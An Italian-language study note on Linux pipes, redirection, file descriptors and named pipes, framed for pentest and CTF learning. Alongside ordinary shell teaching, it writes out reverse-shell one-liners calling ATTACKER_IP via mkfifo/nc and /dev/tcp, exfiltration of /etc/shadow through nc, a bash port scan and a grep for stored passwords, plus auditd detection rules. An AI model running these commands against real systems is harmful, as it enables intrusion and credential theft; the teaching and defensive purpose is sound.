---
tipo: concetto
tag: [linux]
fase: 1
fonti: 4
aggiornato: 2026-06-26
stato: maturo
aliases: ["Pipe e Redirezione", "Redirezione e Pipeline"]
---

# Pipe e Redirezione

## In breve

**Pipe e redirezione** sono meccanismi fondamentali della shell Linux per connettere comandi tra loro e controllare il flusso di dati (stdin, stdout, stderr). Sono alla base di quasi ogni operazione avanzata da terminale: dall'analisi dei log all'automazione offensiva, dai one-liner di enumerazione alle reverse shell senza strumenti aggiuntivi.

---

## I tre file descriptor standard

Ogni processo Linux nasce con tre **file descriptor (fd)** aperti automaticamente:

| FD | Nome | Simbolo | Destinazione default |
|----|------|---------|----------------------|
| 0 | stdin | `<` | Tastiera |
| 1 | stdout | `>` | Terminale (schermo) |
| 2 | stderr | `2>` | Terminale (schermo) |

Tutto in Linux è un file: stdin/stdout/stderr sono file descriptor che puntano a `/dev/pts/N` (terminale virtuale) o a file/pipe/socket.

---

## Redirezione dell'output

```bash
comando > file.txt      # stdout → file (sovrascrive, crea se non esiste)
comando >> file.txt     # stdout → file (append, aggiunge in coda)
comando 2> errori.txt   # stderr → file
comando 2>/dev/null     # stderr → /dev/null (scarta errori — usatissimo)
comando &> tutto.txt    # stdout + stderr → file (Bash 4+)
comando > out.txt 2>&1  # stdout → file, poi stderr → stesso fd di stdout
                        # (equivalente a &> in Bash POSIX-compatible)
```

> [!warning] Ordine conta
> `cmd 2>&1 > file.txt` NON è uguale a `cmd > file.txt 2>&1`. Nel primo caso stderr va al terminale (fd 1 al momento della redirect), stdout va al file. Nel secondo entrambi vanno al file. La shell interpreta da sinistra a destra.

---

## Redirezione dell'input

```bash
comando < file.txt             # stdin letto da file invece che da tastiera
comando < input.txt > out.txt  # input da file, output su file
```

---

## Pipe `|`

La **pipe** (`|`) collega lo **stdout** di un comando con lo **stdin** del successivo, creando una **pipeline** in cui i dati fluiscono in tempo reale (stream processing, no file intermedi):

```bash
comando1 | comando2 | comando3 | ...
```

```bash
# Utenti con shell interattiva
cat /etc/passwd | grep "/bin/bash" | cut -d: -f1

# Porte in ascolto (enumerazione rapida)
ss -tlnp | grep LISTEN | awk '{print $4}'

# Top 10 IP nei log Apache
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -10

# Processi in esecuzione come root
ps aux | grep "^root" | awk '{print $1, $11}'
```

---

## `tee`: fork dell'output

`tee` scrive l'output **sia su file che su stdout** — utile per salvare e continuare la pipeline:

```bash
nmap -sV 10.10.10.5 | tee nmap_output.txt | grep open
# salva TUTTO in nmap_output.txt e mostra solo le porte aperte in tempo reale

comando | tee -a log.txt | prossimo_comando
# -a = append (non sovrascrive)
```

---

## Here-document e here-string

### Here-document (`<<`)
Passa un blocco di testo multiriga come stdin:

```bash
cat << EOF
Riga 1
Riga 2 con $VARIABILE espansa
EOF

# Nessuna espansione di variabili (delimitatore quotato):
cat << 'EOF'
Riga con $VARIABILE non espansa
EOF
```

Utilizzato in script per generare file di configurazione o per passare payload a comandi interattivi.

### Here-string (`<<<`)
Passa una singola stringa come stdin:

```bash
base64 -d <<< "aGVsbG8gd29ybGQ="   # decodifica inline
grep "pattern" <<< "stringa da cercare"
```

---

## Named pipe (FIFO): `mkfifo`

Una **named pipe** è un file speciale nel filesystem (`p` in `ls -la`) che connette processi in modo bidirezionale. È **persistente** (ha un nome nel filesystem) a differenza delle pipe anonime (`|`).

```bash
mkfifo /tmp/mypipe              # crea la named pipe
ls -la /tmp/mypipe              # prwxr-xr-x ... /tmp/mypipe (tipo 'p')
echo "dati" > /tmp/mypipe &     # scrittore in background
cat /tmp/mypipe                 # lettore (blocca fino ai dati)
```

### Named pipe in reverse shell (uso offensivo)

La named pipe è lo strumento classico per reverse shell quando `netcat` non ha l'opzione `-e`:

```bash
# Sul target (senza nc -e):
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# Meccanismo:
# 1. nc riceve comandi dall'attaccante, li scrive in /tmp/f
# 2. cat legge /tmp/f e li passa a bash (stdin)
# 3. bash esegue, l'output (stdout+stderr) torna a nc
# 4. nc lo invia all'attaccante → shell interattiva bidirezionale
```

> [!tip] Alternativa con `/dev/tcp` (solo Bash)
> ```bash
> bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
> ```
> Non richiede mkfifo né nc: usa il virtual file descriptor built-in di Bash. Non funziona sotto `sh`/`dash`.

---

## Redirezione avanzata: duplicare e chiudere fd

```bash
exec 3> /tmp/debug.log          # apre fd 3 in scrittura
echo "messaggio" >&3            # scrive su fd 3
exec 3>&-                       # chiude fd 3

# Swap stdout e stderr (stampa errori, silenzia output normale):
cmd 3>&1 1>&2 2>&3

# Redirect stdout di un processo già avviato (non standard, Linux-only):
# (gdb -pid PID → p close(1) → p open("/tmp/out.txt", ...))
```

---

## Pipe con `xargs`

`xargs` converte stdout in argomenti di un comando (non stdin):

```bash
find / -perm -4000 -type f 2>/dev/null | xargs ls -la
# equivalente ma più efficiente di: find ... -exec ls -la {} \;

cat hosts.txt | xargs -I {} ping -c1 {}
# -I {} = placeholder per ogni riga
```

---

## `2>/dev/null`: il pattern più usato in pentest

```bash
find / -writable -type f 2>/dev/null        # scarta "Permission denied"
getcap -r / 2>/dev/null                     # scarta errori su /proc /sys
ls -la /root 2>/dev/null || echo "no access"
```

`/dev/null` è un "buco nero": qualsiasi cosa ci scrivi sparisce; leggendolo ottieni EOF immediato.

---

## One-liner offensivi con pipe e redirezione

### Enumerazione rapida post-foothold
```bash
id; cat /etc/os-release; sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20
```

### Trasferimento file con `/dev/tcp` (no wget, no curl)
```bash
# Attaccante: lancia listener
nc -lvnp 9001 < file_da_inviare.bin

# Target: riceve e salva
cat < /dev/tcp/ATTACKER_IP/9001 > /tmp/received.bin
```

### Exfiltrazione base64 via stdout
```bash
# Target: codifica e invia
base64 /etc/shadow | nc ATTACKER_IP 9002

# Attaccante: riceve e decodifica
nc -lvnp 9002 | base64 -d > shadow.txt
```

### Port scan TCP puro Bash (no nmap, no nc)
```bash
for p in $(seq 1 1000); do
  (echo >/dev/tcp/10.10.10.5/$p) 2>/dev/null && echo "porta $p aperta"
done
```

### Analisi log rapida: IP più frequenti
```bash
cat /var/log/auth.log | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -rn | head
```

### Grep ricorsivo silenzioso su file di config
```bash
grep -rn "password\|passwd\|secret\|api_key" /etc/ 2>/dev/null
```

---

## Filtri fondamentali della pipeline

I comandi che leggono stdin, trasformano e scrivono stdout si chiamano **filtri**:

| Filtro | Funzione |
|--------|----------|
| `cat` | concatena file su stdout (senza arg: copia stdin) |
| `sort` | ordina le righe (`-n` numerico, `-r` inverso) |
| `uniq` | rimuove duplicati **adiacenti** (richiede input ordinato; `-c` conta, `-d` solo duplicati) |
| `grep PATTERN` | stampa righe che matchano (`-F` letterale/veloce, `-E` regex estese, `-i`, `-v`, `-r`) |
| `wc` | conta righe/parole/byte (`-l` solo righe) |
| `head` / `tail` | prime / ultime righe; `tail -f` segue un file in tempo reale |
| `tee` | scrive su file **e** prosegue nella pipe |

> [!tip] Strumenti moderni nella pipe
> Per dati **strutturati** preferisci tool dedicati ai soli `cut`/`grep`: **`jq`** per JSON, **`awk`** per colonne — molto più robusti. Usa `grep -F` per stringhe letterali (più veloce, niente sorprese da metacaratteri) e `grep -E` per le regex estese.

---

## Best practice e insidie

- **`set -o pipefail` negli script**: di default una pipeline ritorna l'exit status solo dell'**ultimo** comando, mascherando i fallimenti intermedi (es. `false | true` → "successo"). Con `pipefail` un errore in qualunque stadio fa fallire l'intera pipe. Vedi [[Bash Scripting]].
- **Pipe = subshell**: in `cmd | while read ...` il loop gira in una **subshell** e le variabili modificate al suo interno **si perdono** all'uscita. Preferisci la redirezione `< file` o la process substitution `< <(cmd)`:
  ```bash
  count=0; while read -r l; do ((count++)); done < file.txt; echo "$count"   # OK
  count=0; cat file.txt | while read -r l; do ((count++)); done; echo "$count"  # count resta 0!
  ```
- **`tee` con `sudo`** per scrivere file privilegiati: la redirezione `>` userebbe i permessi della shell non-root e fallirebbe. Usa invece:
  ```bash
  echo "voce" | sudo tee -a /etc/file > /dev/null
  ```

---

## Sicurezza: uso offensivo vs hardening

### Uso offensivo (red team / pentest)
- `mkfifo` + `nc` per reverse shell senza nc `-e` — tecnica classica CTF/pentest.
- `bash -i >& /dev/tcp/IP/PORT 0>&1` — reverse shell zero-dependency.
- Pipe in one-liner di enumerazione per filtrare output di `find`, `grep`, `ps`.
- `/dev/null` per silenziare errori e ridurre il rumore durante l'enum.
- `tee` per loggare output di tool offensivi mentre si continua la pipeline.
- Here-doc per passare payload multiriga a comandi interattivi (es. `openssl`, `python`).

### Hardening / difesa
- Monitorare connessioni in uscita su porte non standard (reverse shell).
- EDR / auditd su `execve` di `bash -i`, connessioni `/dev/tcp` da processi web.
- MITRE **T1059.004** (Unix Shell): Detection su `bash -i`, `mkfifo`, pipe verso `nc`.
- Regola auditd: `auditctl -a always,exit -F arch=b64 -S execve -F cmdline=bash.*tcp`.
- Bloccare `mkfifo` per utenti non privilegiati con AppArmor/SELinux profile.

---

## Casi limite e troubleshooting

1. **`> file.txt` svuota il file anche se il comando fallisce** → Bash prima apre (e tronca) il file, poi esegue il comando. Usa `set -o noclobber` per bloccare la sovrascrittura accidentale; usa `>|` per forzarla comunque.
2. **`cmd 2>&1 | tee file.txt` non cattura stderr in tee** → Su Bash vecchio: usa `{ cmd 2>&1; } | tee file.txt`. Il problema è che la pipe crea una subshell.
3. **Named pipe blocca per sempre** → Una named pipe blocca il lettore finché non c'è un scrittore (e viceversa). Se il processo muore, usa `echo > /tmp/f` per sbloccare, poi cancella la pipe.
4. **`xargs` con spazi nei path** → Usa `find -print0 | xargs -0` per separare con `\0` invece di spazio/newline.
5. **`/dev/tcp` non funziona** → Stai girando sotto `sh`/`dash`, non bash. Verifica con `echo $0`. Forza: `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`.

---

## Domande da esame / colloquio

> **D: Cosa sono stdin, stdout e stderr e quali file descriptor usano?**
> Sono i tre canali di I/O standard di ogni processo: stdin (fd 0) = input (default: tastiera), stdout (fd 1) = output normale (default: terminale), stderr (fd 2) = messaggi di errore (default: terminale). La shell permette di redirigere ognuno indipendentemente.

> **D: Differenza tra `>` e `>>`?**
> `>` sovrascrive (o crea) il file; `>>` aggiunge in coda. In pratica: usa `>` quando vuoi una nuova versione del file, `>>` per log o append (es. `echo "voce" >> log.txt`).

> **D: Cos'è `2>/dev/null` e quando lo usi?**
> Redirige lo stderr verso `/dev/null`, che scarta tutto. Si usa per silenziare messaggi "Permission denied" nelle scansioni con `find`, `getcap`, ecc. — mantiene l'output pulito con solo i risultati utili.

> **D: Come funziona la reverse shell con `mkfifo`?**
> `mkfifo /tmp/f` crea una named pipe. `cat /tmp/f | bash -i 2>&1 | nc IP PORT > /tmp/f` collega: nc riceve comandi dall'attaccante → `/tmp/f` → bash li esegue → output torna a nc → attaccante. La named pipe chiude il loop bidirezionale senza l'opzione `-e` di nc.

> **D: Perché `bash -i >& /dev/tcp/IP/PORT 0>&1` funziona?**
> Bash (non dash/sh) implementa `/dev/tcp/host/port` come file descriptor virtuale che apre una socket TCP. `>&` redirige stdout e stderr verso quel socket; `0>&1` redirige stdin dallo stesso socket. Risultato: I/O della bash interattiva viaggia sul canale TCP verso l'attaccante.

> **D: Cosa fa `tee` e perché è utile in pentest?**
> `tee` duplica lo stdout: lo scrive sia su file che lo passa al comando successivo nella pipeline. In pentest permette di salvare l'output completo di uno scan (es. nmap) mentre si continua a filtrarlo in tempo reale.

---

## Collegamenti

- [[Bash Scripting]]
- [[grep]]
- [[awk]]
- [[sed]]
- [[find]]
- [[Comandi Linux di Base]]
- [[Reverse Shell e Bind Shell]]
- [[Log Analysis]]

## Fonti

- Man page bash (sezione REDIRECTION): https://man7.org/linux/man-pages/man1/bash.1.html
- The Linux Command Line – cap. 6 "Redirection", cap. 20 "Text Processing": https://linuxcommand.org/tlcl.php
- linuxcommand.org — "Redirection" (pipefail, filtri, while-read subshell); ricerca 2025
- OverTheWire Bandit (esercizi pratici): https://overthewire.org/wargames/bandit/
